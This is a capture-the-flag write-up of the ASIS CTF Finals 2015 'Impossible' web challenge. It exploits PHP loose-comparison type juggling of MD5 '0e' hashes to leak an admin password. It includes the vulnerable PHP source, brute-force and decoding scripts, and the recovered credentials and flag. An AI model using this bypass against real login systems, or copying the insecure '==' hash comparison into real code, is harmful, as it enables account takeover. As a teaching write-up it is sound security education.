---
title: "ASIS CTF Finals 2015 - Impossible (Web)"
header:
  overlay_image: /assets/images/asisfinals2015/impossible/header.jpg
  overlay_filter: 0.5
tags:
  - asisfinals2015
  - writeup
  - web
---

Type juggling in PHP's weak comparison operator (==) allows an attacker to
generate passwords to an administrator account and bypass the original MD5
hashing mechanism.

## Challenge Description

#### Points

225

#### Solves

28

#### Description

```
Go there and find the flag.
```

## Solution

We're given a link that goes to http://impossible.asis-ctf.ir/. It's a simple
login and register site.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/1.png){: .align-center}

Checking robots.txt again:

![2]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/2.png){: .align-center}
![3]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/3.png){: .align-center}

So, after downloading and unpacking the archive file, it looks like we have the
source code to the web application:

```shell
$ wget http://impossible.asis-ctf.ir/backup/1444419635.tar.gz
--2015-10-12 20:44:26--  http://impossible.asis-ctf.ir/backup/1444419635.tar.gz
Resolving impossible.asis-ctf.ir (impossible.asis-ctf.ir)... 185.82.202.62
Connecting to impossible.asis-ctf.ir (impossible.asis-ctf.ir)|185.82.202.62|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6162 (6.0K) [application/octet-stream]
Saving to: ‘1444419635.tar.gz’

100%[=============================================================================================================>] 6,162       --.-K/s   in 0.001s

2015-10-12 20:44:30 (6.78 MB/s) - ‘1444419635.tar.gz’ saved [6162/6162]

$ tar xvfz 1444419635.tar.gz
users.dat
impossible/
impossible/functions.php
impossible/index.php
impossible/register.php
```

Important features from the files:

#### functions.php

```php
<?php
    function username_exist($username) {
        $data = file_get_contents('../users.dat');
        $users = explode("\n", $data);
        foreach ($users as $key => $value) {
            $user_data = explode(",", $value);
            if ($user_data[2] == '1' && base64_encode($username) == $user_data[0]) {
                return true;
            }
        }
        return false;
    }

    function add_user($username, $email, $password) {
        file_put_contents("../users.dat", base64_encode($username) . "," . base64_encode($email) . ",0\n", $flag = FILE_APPEND);
        file_put_contents("../passwords.dat", md5($username) . "," . base64_encode($password) . "\n", $flag = FILE_APPEND);
    }

    function get_user($username) {
        $data = file_get_contents('../passwords.dat');
        $passwords = explode("\n", $data);
        foreach ($passwords as $key => $value) {
            $user_data = explode(",", $value);
            if (md5($username) == $user_data[0]) {
                return array($username, base64_decode($user_data[1]));
            }
        }
        return array("", "");
    }
?>
```

#### index.php

```php
<?php
    require("./functions.php");
?>
<?php
    $login = false;

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (!(isset($_POST['username']) && isset($_POST['password']))) {
            exit();
        }

        if(username_exist($_POST['username'])) {
            $user_info = get_user($_POST['username']);
            if ($user_info[1] == $_POST['password']) {
                $login = true;
            }
        }

    }

?>
...
<?php
    if ($login) {
?>
        <div>
            <h1>Flag is <?php echo file_get_contents("../flag.txt"); ?></h1>
        </div>
<?php
    } else {
?>
...
</html>
```

#### register.php

```php
<?php
    require("./functions.php");
?>
<?php

    $check = true;

    $result = 0;
    $title = "Forum - Registration";
    $user_info = array();

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        if (!(isset($_POST['username']) && isset($_POST['email']) && isset($_POST['password']))) {
            exit();
        }
        $check = preg_match("/^[a-zA-Z0-9]+$/", $_POST['username']);
        if (!$check) {
        } elseif (username_exist($_POST['username'])) {
            $result = 1;
            $title = "Registration Failed";
        } else {
            add_user($_POST['username'], $_POST['email'], $_POST['password']);
            $user_info = get_user($_POST['username']);
            $result = 2;
            $title = "Registration Complete";
        }
    }
?>
...
<?php
    if ($result == 0) {
?>
            <form class="form-signin" method="POST">
...
<?php
    } elseif ($result == 1) {
?>
            <h1>Registration Failed!</h1>
            <h3>Username already exists.</h3>
<?php
    } elseif ($result == 2) {
?>
            <h1>Registration Complete!</h1>
            <h3>username: <?php echo $user_info[0]; ?></h3>
            <h3>password: <?php echo $user_info[1]; ?></h3>
            <h4>Your account will be activated later.</h4>
<?php
    }
?>
...
    </body>
</html>
```

Now, the important thing we have to observe first is that in register.php:

```php
...
} else {
            add_user($_POST['username'], $_POST['email'], $_POST['password']);
            $user_info = get_user($_POST['username']);
            $result = 2;
            $title = "Registration Complete";
        }
...
} elseif ($result == 2) {
?>
...
            <h3>password: <?php echo $user_info[1]; ?></h3>
...
```

Notice how the password output is from `$user_info[1]` which is in turn returned
from the `get_user($_POST['username'])` function. This is our information leak
primitive. The password comes from the database file, not the `$_POST` request
parameter. Taking a look at the relevant function:

```php
    function add_user($username, $email, $password) {
...
        file_put_contents("../passwords.dat", md5($username) . "," . base64_encode($password) . "\n", $flag = FILE_APPEND);
    }

    function get_user($username) {
...
            if (md5($username) == $user_data[0]) {
                return array($username, base64_decode($user_data[1]));
            }
...
    }
```

So, when adding a user, the username is md5 hashed and the password is base64
encoded then appended to the password database file. When retrieving the user
details, the md5 of the supplied username to test is checked against the md5
hashed value in the password database. Therein lies the crux of the challenge.
The == operator is used to check the md5 hash which means this piece of code is
vulnerable to type juggling!

If we look at this blog post,
https://www.alertlogic.com/blog/writing-exploits-for-exotic-bug-classes-php-type-juggling/,
we can see that strings that look like numbers are type juggled when compared
with ==. So, if we can find an existing user with a username that gets hashed to
something that looks like a number in scientific notation like
0e004561083131340065739640281486, then the comparison will be reduced to
comparing zeroes. Since 0 raised to the power of anything is 0.

Now, let's revert our attention to the users.dat. In this file we have a
sampling of users.

```shell
...
U2luZHJlODk=,ZWphdGRvdGNvbUB5YWhvby5jb20N,1
dm9sYWNpb3VzODA=,YWttYWxzYTkwQHlhaG9vLmNvbQ0=,1
bWFyaW5lMjI4,aWxhaF9uZm0wMUB5YWhvby5jb20N,1
cGh1Y2tOdXQ=,YXpsaW5fNDUzMUB5YWhvby5jb20ubXkN,1
Z3JlZ3k3OQ==,Ym9uaWZhY2VfYnJvZGllQHlhaG9vLmNvbQ0=,1
QnVzdGVyNDQ=,aWVyaXNtYWxpZWthODVAeWFob28uY29tDQ==,1
SGVyclJvY2tlcg==,Q3Jvd19aaWdAeWFob28uY29tDQ==,1
YWZyb3N0dWQxMg==,YXppZXJhaDc4QHlhaG9vLmNvbQ0=,1
a2plbGtlbg==,bWF6bGFuX2RyY0B5YWhvby5jb20N,1
Y2hldmFs,RmlleWE5Nl9jcmF6eUB5YWhvby5jb20N,1
...
```

Let's write a script to decode everything:

```python
import base64

lines = file("users.dat").read().strip().split("\n")
entries = [i.split(",") for i in lines]
entries_field = [(base64.decodestring(i[0]), base64.decodestring(i[1])) for i in
        entries]

for i in entries_field:
    print ":".join(i)
```

```shell
$ python decode.py
badboyhof:ballyciapretticia@yahoo.com
orvv1979:aizamahamd@yahoo.com
boogalloo032457:Muiz_kakashi@yahoo.com
tarzane:mynasstc@yahoo.com
...
```

Now, let's upgrade our script to MD5 hash the usernames and look for one that
matches something that can be type juggled into a number in scientific notation.

```python
import base64
import md5

lines = file("users.dat").read().strip().split("\n")
entries = [i.split(",") for i in lines]
entries_field = [(base64.decodestring(i[0]), base64.decodestring(i[1])) for i in
        entries]

for i in entries_field:
    hashed = md5.md5(i[0]).hexdigest()
    if hashed[:2] == "0e" and hashed[2:].isdigit():
        print hashed, i[0]
```

```shell
$ python decode.py
0e004561083131340065739640281486 adm2salwg
```

Oooh, so if we can find another string for a username that creates an md5 hash
that can be type juggled to a number (which would be 0), then we can bypass the
check! Here is a script to generate strings:

```python
import md5
import string
import itertools

good = string.ascii_letters + string.digits
for i in itertools.product(good, good, good, good, good):
    hashed = md5.md5("".join(i)).hexdigest()
    if hashed[:2] == "0e" and hashed[2:].isdigit():
        print hashed, "".join(i)
```

```shell
$ python generate.py
0e591948146966052067035298880982 byGcY
```

Now, we have our special username, we can use that to register for an account
and we will get the password to adm2salwg :)

![4]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/4.png){: .align-center}
![5]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/5.png){: .align-center}

So, let's use our newly found credentials, adm2salwg:1W@ewes$%rq0 to log in.

![6]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/6.png){: .align-center}
![7]({{ site.url }}{{ site.baseurl }}/assets/images/asisfinals2015/impossible/7.png){: .align-center}

And we got our flag: **ASIS{d9fb4932eb4c45aa793301174033dff9}**
